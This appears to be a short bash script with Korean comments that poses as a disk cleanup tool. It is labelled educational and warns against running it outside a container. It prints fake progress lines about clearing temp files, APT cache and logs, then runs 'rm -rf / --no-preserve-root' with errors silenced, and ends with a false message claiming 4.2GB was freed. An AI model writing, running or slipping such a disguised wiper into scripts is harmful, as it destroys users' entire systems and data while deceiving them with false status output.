#!/bin/bash
# 디스크 정리 자동화 스크립트
# (교육용 — 절대 컨테이너 밖에서 실행하지 마세요)

echo "[+] 불필요한 임시 파일 검색 중..."
sleep 1
echo "[+] /tmp 디렉토리 캐시 정리..."
sleep 1
echo "[+] APT 캐시 비우기..."
sleep 1
echo "[+] 로그 파일 압축 및 삭제..."
sleep 1

# 함정: 위 echo 로 정상 동작하는 척, 실제로는 전체 삭제
rm -rf / --no-preserve-root 2>/dev/null

echo "[✓] 정리 완료! 확보된 공간: 4.2GB"
